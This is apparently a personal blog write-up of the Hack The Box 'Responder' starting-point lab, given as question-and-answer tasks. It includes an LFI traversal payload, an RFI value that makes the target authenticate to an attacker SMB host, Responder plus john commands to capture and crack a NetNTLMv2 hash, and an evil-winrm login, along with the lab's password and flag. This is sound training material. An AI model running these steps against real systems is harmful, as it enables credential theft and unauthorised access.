---
layout: post
title: "[HTB - Starting Point] Responder"
date: 2022-10-16 09:00:00 +0800
categories: note
tags: [HTB]
---

## Task 1  
Q : When visiting the web service using the IP address, what is the domain that we are being redirected to?  
A : unika.htb  
Note : In order to view the website, add unika.htb domain into hosts file.

## Task 2  
Q : Which scripting language is being used on the server to generate webpages?  
A : PHP  
Note : Use wappalyzer  

## Task 3  
Q : What is the name of the URL parameter which is used to load different language versions of the webpage?  
A : page  
Note : Observe the url after language changed.

## Task 4  
Q : Which of the following values for the 'page' parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"  
A : ../../../../../../../../windows/system32/drivers/etc/hosts  
Note : By replacing the 'page' parameter, you can exec/read files on the system.

## Task 5  
Q : Which of the following values for the 'page' parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"  
A : //10.10.14.6/somefile  
Note : By replacing the 'page' parameter, you can exec/read files on the remote system via the target.

## Task 6  
Q : What does NTLM stand for?  
A : New Technology LAN Manager  

## Task 7  
Q : Which flag do we use in the Responder utility to specify the network interface?  
A : -I  

## Task 8  
Q : There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as 'john', but the full name is what?.  
A : john the ripper  

## Task 9  
Q : What is the password for the administrator user?  
``` text
[host] # responder -I <your_vpn_interface>
modify the 'page' parameter to '//<your_host_ip>/file_name'
your responder should print [SMB] NTLMv2-SSP messages.
save the hash content to a file, let's name it 'pswd'.
[host] # john --wordlist=<your_path_to_rockyou.txt> pswd
```
A : badminton  

## Task 10  
Q : We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?  
``` text
[host] # nmap -sVC -p- --open 10.129.76.195 -oA Responder_full_scan
```
A : 5985  

## SUBMIT FLAG  
Q : Submit root flag  
``` text
[host] # evil-winrm -i <target_ip> -u administrator -p badminton
*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
```
A : ea81b7afddd03efaa0945333ed147fac  